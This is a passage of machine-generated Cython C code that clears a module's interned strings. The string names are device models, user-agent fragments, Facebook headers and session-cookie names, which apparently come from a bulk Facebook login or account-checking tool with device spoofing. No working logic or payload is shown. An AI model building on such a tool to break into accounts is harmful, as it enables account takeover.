  Py_CLEAR(clear_module_state->__pyx_kp_s_Mi_Note_10_Pro);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Mi_Note_11);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Mi_Note_2);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Mi_Note_3);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Mi_Note_8);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Mi_Note_LTE);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Mi_Note_Pro);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Mi_One);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Mi_One_C1);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Mi_One_Plus);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Mi_Pad);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Mi_Pad4);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Mi_Pad5);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Mi_Pad_2);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Mi_Pad_3);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Mi_Pad_4);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Mi_Pad_4_Plus);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Mi_Pad_5);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Mi_Pad_5_Pro);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Mi_Pad_5_Pro_5G);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Mi_Play);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Mi_XL);
  Py_CLEAR(clear_module_state->__pyx_n_s_Milestone);
  Py_CLEAR(clear_module_state->__pyx_n_s_Miracle);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Mix_Fold_2);
  Py_CLEAR(clear_module_state->__pyx_kp_u_Mobile_Safari);
  Py_CLEAR(clear_module_state->__pyx_kp_u_Mobile_Safari_537_36_XiaoMi_Miu);
  Py_CLEAR(clear_module_state->__pyx_n_s_ModuleNotFoundError);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Moment_Sprint);
  Py_CLEAR(clear_module_state->__pyx_n_s_Monza);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Motion_Plus);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Moto_C);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Moto_E2_4G_LTE);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Moto_E3_Power);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Moto_E4);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Moto_E4_Plus);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Moto_E5);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Moto_E5_Plus);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Moto_G);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Moto_G3);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Moto_G3_Turbo_Edition);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Moto_G4);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Moto_G5_Plus);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Moto_G5s);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Moto_G5s_Plus);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Moto_G6);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Moto_G_2nd_Gen);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Moto_G_Play);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Moto_X);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Moto_X_2nd_Gen_AT_T);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Moto_Z);
  Py_CLEAR(clear_module_state->__pyx_kp_u_Mozilla_5_0_Linux_Android);
  Py_CLEAR(clear_module_state->__pyx_kp_u_Mozilla_5_0_Linux_U_Android_10_e);
  Py_CLEAR(clear_module_state->__pyx_kp_u_Mozilla_5_0_Linux_U_Android_13_p);
  Py_CLEAR(clear_module_state->__pyx_kp_u_Mozilla_5_0_Linux_arm_64_Android);
  Py_CLEAR(clear_module_state->__pyx_kp_u_Mozilla_5_0_Macintosh_Intel_Mac);
  Py_CLEAR(clear_module_state->__pyx_kp_u_Mozilla_5_0_Windows_NT);
  Py_CLEAR(clear_module_state->__pyx_kp_u_Mozilla_5_0_Windows_NT_10_0_Win6);
  Py_CLEAR(clear_module_state->__pyx_kp_u_Mozilla_5_0_Windows_NT_6);
  Py_CLEAR(clear_module_state->__pyx_kp_u_Mozilla_5_0_Windows_U_Windows_NT);
  Py_CLEAR(clear_module_state->__pyx_kp_u_Mozilla_5_0_X11_Linux_x86_64_And);
  Py_CLEAR(clear_module_state->__pyx_kp_s_MultiPhone_3350_Duo);
  Py_CLEAR(clear_module_state->__pyx_kp_s_MultiPhone_4044_Duo);
  Py_CLEAR(clear_module_state->__pyx_kp_s_MultiPhone_5504_DUO);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Multipad_2_Ultra_Duo_8_0_3G);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Multiphone_7600_Duo);
  Py_CLEAR(clear_module_state->__pyx_n_s_N4F26J);
  Py_CLEAR(clear_module_state->__pyx_n_s_N4F26X);
  Py_CLEAR(clear_module_state->__pyx_n_s_N970FXXS8ETK4);
  Py_CLEAR(clear_module_state->__pyx_n_s_N986BXXU1BTJ4);
  Py_CLEAR(clear_module_state->__pyx_n_s_N9F27L);
  Py_CLEAR(clear_module_state->__pyx_n_s_ND);
  Py_CLEAR(clear_module_state->__pyx_n_s_NDE63H);
  Py_CLEAR(clear_module_state->__pyx_n_s_NMF2);
  Py_CLEAR(clear_module_state->__pyx_n_s_NMF26X);
  Py_CLEAR(clear_module_state->__pyx_kp_s_NMF26X_2);
  Py_CLEAR(clear_module_state->__pyx_n_s_NMF27D);
  Py_CLEAR(clear_module_state->__pyx_n_s_NRD90M);
  Py_CLEAR(clear_module_state->__pyx_kp_s_NRD90M_2);
  Py_CLEAR(clear_module_state->__pyx_n_s_Name);
  Py_CLEAR(clear_module_state->__pyx_n_u_NokiaX);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Not_A_Brand_v_8_0_0_0_Chromium);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Not_A_Brand_v_8_Chromium_v_120);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Note_12_Pro);
  Py_CLEAR(clear_module_state->__pyx_n_s_November);
  Py_CLEAR(clear_module_state->__pyx_kp_u_OAuth);
  Py_CLEAR(clear_module_state->__pyx_kp_s_OPM2_171026_006_C1);
  Py_CLEAR(clear_module_state->__pyx_kp_s_OPM6_171019_030_K1);
  Py_CLEAR(clear_module_state->__pyx_kp_s_OT_7025D);
  Py_CLEAR(clear_module_state->__pyx_n_s_OUT);
  Py_CLEAR(clear_module_state->__pyx_n_s_October);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Optimus_Vu);
  Py_CLEAR(clear_module_state->__pyx_kp_s_P10_Lite_LTE);
  Py_CLEAR(clear_module_state->__pyx_n_s_P2);
  Py_CLEAR(clear_module_state->__pyx_kp_s_P20_Lite);
  Py_CLEAR(clear_module_state->__pyx_kp_s_P30_Pro_Global);
  Py_CLEAR(clear_module_state->__pyx_n_s_P3400);
  Py_CLEAR(clear_module_state->__pyx_kp_s_P55_Max);
  Py_CLEAR(clear_module_state->__pyx_kp_s_P7_Max);
  Py_CLEAR(clear_module_state->__pyx_kp_s_P8_Lite);
  Py_CLEAR(clear_module_state->__pyx_kp_s_P9_Lite);
  Py_CLEAR(clear_module_state->__pyx_n_s_PM);
  Py_CLEAR(clear_module_state->__pyx_kp_s_PPR1_180610_011);
  Py_CLEAR(clear_module_state->__pyx_kp_s_PPR2_180905_006);
  Py_CLEAR(clear_module_state->__pyx_kp_s_PQ1A_181205_002_A1);
  Py_CLEAR(clear_module_state->__pyx_kp_s_PQ1A_181205_006);
  Py_CLEAR(clear_module_state->__pyx_kp_s_PQ3B_190801_002);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Pacific_800i);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Pad_6_Pro);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Pearl_8100);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Phoenix_2);
  Py_CLEAR(clear_module_state->__pyx_n_s_Phone);
  Py_CLEAR(clear_module_state->__pyx_n_s_PhotosAYYUB);
  Py_CLEAR(clear_module_state->__pyx_n_s_Pixel);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Pixel_3);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Pixel_XL);
  Py_CLEAR(clear_module_state->__pyx_n_s_Pixi);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Please_Confirm_Email);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Pocophone_F1);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Prada_3_0);
  Py_CLEAR(clear_module_state->__pyx_n_s_Pre3);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Primo_GH7);
  Py_CLEAR(clear_module_state->__pyx_kp_u_Profile_MIDP_2_1_Configuration_C);
  Py_CLEAR(clear_module_state->__pyx_kp_s_QKQ1_190910_002);
  Py_CLEAR(clear_module_state->__pyx_kp_s_QP1A_191105_003);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Qin_1s);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Qin_2);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Qin_2_Pro);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Quad_EVO_Energy_5);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Quantum_4);
  Py_CLEAR(clear_module_state->__pyx_n_s_R);
  Py_CLEAR(clear_module_state->__pyx_kp_s_RD1A_201105_003_C1);
  Py_CLEAR(clear_module_state->__pyx_n_s_RMX2085);
  Py_CLEAR(clear_module_state->__pyx_n_s_RMX2185);
  Py_CLEAR(clear_module_state->__pyx_kp_s_RM_560);
  Py_CLEAR(clear_module_state->__pyx_kp_s_RP1A_201005_004_A1);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Radar_4G);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Radar_C110e);
  Py_CLEAR(clear_module_state->__pyx_n_s_Random);
  Py_CLEAR(clear_module_state->__pyx_n_s_Realme);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Realme_2);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Red_Rice);
  Py_CLEAR(clear_module_state->__pyx_kp_u_Redmi);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_11);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_12);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_2);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_3);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_3S);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_4);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_4A);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_4X);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_5);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_5A);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_5_Plus);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_6);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_7);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_8);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_9);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_A1);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_A2);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_A3);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_K30);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_K40);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_K50);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_K60);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_Note);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_Note10);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_Note10T);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_Note7);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_Note8);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_Note8T);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_Note9);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_Note_1);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_Note_10Redmi_Note_11);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_Note_12);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_Note_12T);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_Note_13);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_Note_15_Pro);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_Note_2);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_Note_3);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_Note_4);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_Note_4X);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_Note_5);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_Note_5A);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_Note_5A_Prime);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_Note_5_Pro);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_Note_6);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_Note_7);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_Note_7_Pro);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_Note_8T);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_Note_8_Pro);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_Note_9);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_Note_9S);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_Note_9T);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_Note_9T_5G);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_Note_9_5G);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_Note_9_Pro);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_Note_9_Pro_5G);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_Note_9_Pro_Max);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_Note_Prime);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_Pad);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_Pro);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_S2);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_X);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_Y1);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_Y1_Lite);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_Y2);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_Y3);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Redmi_note);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Rex_60);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Rex_80);
  Py_CLEAR(clear_module_state->__pyx_n_s_Rhyme);
  Py_CLEAR(clear_module_state->__pyx_n_s_Ruby);
  Py_CLEAR(clear_module_state->__pyx_n_s_S);
  Py_CLEAR(clear_module_state->__pyx_n_s_S4502M);
  Py_CLEAR(clear_module_state->__pyx_n_s_S4505M);
  Py_CLEAR(clear_module_state->__pyx_n_s_S4702M);
  Py_CLEAR(clear_module_state->__pyx_n_s_S580);
  Py_CLEAR(clear_module_state->__pyx_n_s_S616);
  Py_CLEAR(clear_module_state->__pyx_n_s_S660);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SA_str_rr_1_9_Mobile_Safari_str);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SD1A_210817_037_A1);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SGH_E250);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SGH_I547);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_A500F);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_A500FU);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_A500H);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_G485F);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_G900F);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_G920F);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_G930F);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_G935F);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_G950F);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_J320F);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_J320FN);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_J320H);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_J320M);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_J510FN);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_J701F);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_T111);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_T230);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_T231);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_T235);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_T310);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_T311);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_T315);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_T525);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_T531);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_T535);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_T555);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_T561);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_T705);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_T805);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SM_T820);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SPH_L720);
  Py_CLEAR(clear_module_state->__pyx_kp_s_SQ1A_211205_008);
  Py_CLEAR(clear_module_state->__pyx_kp_u_Safari);
  Py_CLEAR(clear_module_state->__pyx_kp_u_Safari_537_36_Edg);
  Py_CLEAR(clear_module_state->__pyx_n_s_Sensation);
  Py_CLEAR(clear_module_state->__pyx_n_s_September);
  Py_CLEAR(clear_module_state->__pyx_n_s_Session);
  Py_CLEAR(clear_module_state->__pyx_n_s_Spark);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Star_3_Duos);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Storm_9530);
  Py_CLEAR(clear_module_state->__pyx_n_s_Stream);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Stylo_2_Plus_T_Mobile);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Stylus_2);
  Py_CLEAR(clear_module_state->__pyx_n_s_T500XXU3BUA8);
  Py_CLEAR(clear_module_state->__pyx_n_s_T970XXU3BUI7);
  Py_CLEAR(clear_module_state->__pyx_kp_s_TM_4377);
  Py_CLEAR(clear_module_state->__pyx_kp_s_TQ1A_230105_001_A3);
  Py_CLEAR(clear_module_state->__pyx_n_s_ThreadPoolExecutor);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Torch_4G_9810);
  Py_CLEAR(clear_module_state->__pyx_kp_s_User_Agent);
  Py_CLEAR(clear_module_state->__pyx_kp_s_V10_AT_T);
  Py_CLEAR(clear_module_state->__pyx_kp_s_V10_T_Mobile);
  Py_CLEAR(clear_module_state->__pyx_kp_s_V10_Verizon);
  Py_CLEAR(clear_module_state->__pyx_n_s_V1Max);
  Py_CLEAR(clear_module_state->__pyx_n_s_V20);
  Py_CLEAR(clear_module_state->__pyx_kp_s_V20_AT_T);
  Py_CLEAR(clear_module_state->__pyx_kp_s_V20_Sprint);
  Py_CLEAR(clear_module_state->__pyx_kp_s_V20_T_Mobile);
  Py_CLEAR(clear_module_state->__pyx_kp_s_V20_Verizon);
  Py_CLEAR(clear_module_state->__pyx_n_s_V3);
  Py_CLEAR(clear_module_state->__pyx_n_s_V5);
  Py_CLEAR(clear_module_state->__pyx_n_s_V5s);
  Py_CLEAR(clear_module_state->__pyx_n_s_V7);
  Py_CLEAR(clear_module_state->__pyx_kp_s_V7_Plus);
  Py_CLEAR(clear_module_state->__pyx_n_s_V808);
  Py_CLEAR(clear_module_state->__pyx_n_s_V9);
  Py_CLEAR(clear_module_state->__pyx_kp_s_VR_Bot_552);
  Py_CLEAR(clear_module_state->__pyx_n_s_VX5500);
  Py_CLEAR(clear_module_state->__pyx_n_s_Valencia);
  Py_CLEAR(clear_module_state->__pyx_n_s_ValueError);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Vdeo_2);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Vega_Iron_2_WiFi);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Vibe_K5);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Vibe_K5_Note);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Vibe_K5_Plus_Dual_SIM);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Vibe_X);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Vibe_Z);
  Py_CLEAR(clear_module_state->__pyx_n_s_Vision);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Vision_3_Dual_SIM);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Volt_LS740);
  Py_CLEAR(clear_module_state->__pyx_kp_u_WOW64_AppleWebKit);
  Py_CLEAR(clear_module_state->__pyx_n_s_X);
  Py_CLEAR(clear_module_state->__pyx_n_s_X1);
  Py_CLEAR(clear_module_state->__pyx_n_s_X2);
  Py_CLEAR(clear_module_state->__pyx_n_s_X3);
  Py_CLEAR(clear_module_state->__pyx_n_s_X4);
  Py_CLEAR(clear_module_state->__pyx_n_s_X5);
  Py_CLEAR(clear_module_state->__pyx_kp_s_XD);
  Py_CLEAR(clear_module_state->__pyx_kp_s_XD_2);
  Py_CLEAR(clear_module_state->__pyx_kp_u_XD_3);
  Py_CLEAR(clear_module_state->__pyx_kp_s_X_FB_Connection_Bandwidth);
  Py_CLEAR(clear_module_state->__pyx_kp_s_X_FB_Connection_Type);
  Py_CLEAR(clear_module_state->__pyx_kp_s_X_FB_Friendly_Name);
  Py_CLEAR(clear_module_state->__pyx_kp_s_X_FB_HTTP_Engine);
  Py_CLEAR(clear_module_state->__pyx_kp_s_X_FB_Net_HNI);
  Py_CLEAR(clear_module_state->__pyx_kp_s_X_FB_SIM_HNI);
  Py_CLEAR(clear_module_state->__pyx_n_s_Y);
  Py_CLEAR(clear_module_state->__pyx_n_s_Y21);
  Py_CLEAR(clear_module_state->__pyx_n_s_Y21L);
  Py_CLEAR(clear_module_state->__pyx_n_s_Y28);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Y336_U02);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Y3_2018);
  Py_CLEAR(clear_module_state->__pyx_n_s_Y51);
  Py_CLEAR(clear_module_state->__pyx_n_s_Y51L);
  Py_CLEAR(clear_module_state->__pyx_n_s_Y55L);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Y5_Dual_SIM_2017);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Y5_II);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Y5_Prime_2018_Dual_SIM);
  Py_CLEAR(clear_module_state->__pyx_n_s_Y65);
  Py_CLEAR(clear_module_state->__pyx_n_s_Y66);
  Py_CLEAR(clear_module_state->__pyx_n_s_Y69);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Y6_2018);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Y6_Dual_SIM_2018);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Y6_Prime_2018);
  Py_CLEAR(clear_module_state->__pyx_n_s_Y71);
  Py_CLEAR(clear_module_state->__pyx_n_s_Y81);
  Py_CLEAR(clear_module_state->__pyx_n_s_Y83);
  Py_CLEAR(clear_module_state->__pyx_kp_s_YP_GI1);
  Py_CLEAR(clear_module_state->__pyx_kp_u_YaApp_Android);
  Py_CLEAR(clear_module_state->__pyx_kp_s_YaBrowser);
  Py_CLEAR(clear_module_state->__pyx_n_s_Yes);
  Py_CLEAR(clear_module_state->__pyx_kp_s_Yota_Phone_2);
  Py_CLEAR(clear_module_state->__pyx_n_s_Zong);
  Py_CLEAR(clear_module_state->__pyx_kp_s__11);
  Py_CLEAR(clear_module_state->__pyx_kp_u__11);
  Py_CLEAR(clear_module_state->__pyx_kp_s__119);
  Py_CLEAR(clear_module_state->__pyx_kp_s__124);
  Py_CLEAR(clear_module_state->__pyx_n_s__160);
  Py_CLEAR(clear_module_state->__pyx_kp_s__25);
  Py_CLEAR(clear_module_state->__pyx_kp_u__25);
  Py_CLEAR(clear_module_state->__pyx_kp_s__32);
  Py_CLEAR(clear_module_state->__pyx_kp_s__33);
  Py_CLEAR(clear_module_state->__pyx_kp_s__38);
  Py_CLEAR(clear_module_state->__pyx_kp_u__38);
  Py_CLEAR(clear_module_state->__pyx_kp_u__48);
  Py_CLEAR(clear_module_state->__pyx_kp_u__54);
  Py_CLEAR(clear_module_state->__pyx_kp_s__63);
  Py_CLEAR(clear_module_state->__pyx_kp_u__63);
  Py_CLEAR(clear_module_state->__pyx_kp_s__71);
  Py_CLEAR(clear_module_state->__pyx_kp_u__71);
  Py_CLEAR(clear_module_state->__pyx_kp_s__72);
  Py_CLEAR(clear_module_state->__pyx_kp_s__74);
  Py_CLEAR(clear_module_state->__pyx_n_s__75);
  Py_CLEAR(clear_module_state->__pyx_kp_s__77);
  Py_CLEAR(clear_module_state->__pyx_kp_s__83);
  Py_CLEAR(clear_module_state->__pyx_kp_u__84);
  Py_CLEAR(clear_module_state->__pyx_kp_u__85);
  Py_CLEAR(clear_module_state->__pyx_kp_s__88);
  Py_CLEAR(clear_module_state->__pyx_n_s__93);
  Py_CLEAR(clear_module_state->__pyx_n_s_a);
  Py_CLEAR(clear_module_state->__pyx_n_s_aV);
  Py_CLEAR(clear_module_state->__pyx_n_s_accept);
  Py_CLEAR(clear_module_state->__pyx_kp_s_accept_language);
  Py_CLEAR(clear_module_state->__pyx_n_s_accessToken);
  Py_CLEAR(clear_module_state->__pyx_n_s_adid);
  Py_CLEAR(clear_module_state->__pyx_n_s_advertiser_id);
  Py_CLEAR(clear_module_state->__pyx_n_s_allow_redirects);
  Py_CLEAR(clear_module_state->__pyx_n_s_android_version);
  Py_CLEAR(clear_module_state->__pyx_n_s_api1);
  Py_CLEAR(clear_module_state->__pyx_n_s_api1_locals_genexpr);
  Py_CLEAR(clear_module_state->__pyx_n_s_api2);
  Py_CLEAR(clear_module_state->__pyx_n_s_api2_locals_genexpr);
  Py_CLEAR(clear_module_state->__pyx_n_s_append);
  Py_CLEAR(clear_module_state->__pyx_kp_s_application_x_www_form_urlencode);
  Py_CLEAR(clear_module_state->__pyx_n_s_approval);
  Py_CLEAR(clear_module_state->__pyx_n_s_args);
  Py_CLEAR(clear_module_state->__pyx_n_s_ask);
  Py_CLEAR(clear_module_state->__pyx_n_s_asyncio_coroutines);
  Py_CLEAR(clear_module_state->__pyx_n_s_authenticate);
  Py_CLEAR(clear_module_state->__pyx_n_s_authority);
  Py_CLEAR(clear_module_state->__pyx_n_s_b64encode);
  Py_CLEAR(clear_module_state->__pyx_n_s_bV);
  Py_CLEAR(clear_module_state->__pyx_n_s_base64);
  Py_CLEAR(clear_module_state->__pyx_n_s_bbbb);
  Py_CLEAR(clear_module_state->__pyx_n_s_bln);
  Py_CLEAR(clear_module_state->__pyx_n_s_br_virshon);
  Py_CLEAR(clear_module_state->__pyx_n_s_build);
  Py_CLEAR(clear_module_state->__pyx_n_s_button_with_disabled);
  Py_CLEAR(clear_module_state->__pyx_n_s_bx);
  Py_CLEAR(clear_module_state->__pyx_n_s_bz);
  Py_CLEAR(clear_module_state->__pyx_n_s_cV);
  Py_CLEAR(clear_module_state->__pyx_n_s_c_user);
  Py_CLEAR(clear_module_state->__pyx_kp_s_c_user_xs);
  Py_CLEAR(clear_module_state->__pyx_kp_s_cache_control);
  Py_CLEAR(clear_module_state->__pyx_kp_s_cell_CTRadioAccessTechnologyHSDP);
  Py_CLEAR(clear_module_state->__pyx_n_s_check_output);
  Py_CLEAR(clear_module_state->__pyx_n_s_checkpoint);
  Py_CLEAR(clear_module_state->__pyx_n_s_choice);
  Py_CLEAR(clear_module_state->__pyx_n_s_choices);
  Py_CLEAR(clear_module_state->__pyx_n_s_chorom);
  Py_CLEAR(clear_module_state->__pyx_n_s_ckk);
  Py_CLEAR(clear_module_state->__pyx_n_s_class_getitem);
  Py_CLEAR(clear_module_state->__pyx_n_s_clear);
  Py_CLEAR(clear_module_state->__pyx_n_s_client_country_code);
  Py_CLEAR(clear_module_state->__pyx_n_s_cline_in_traceback);
  Py_CLEAR(clear_module_state->__pyx_n_s_close);
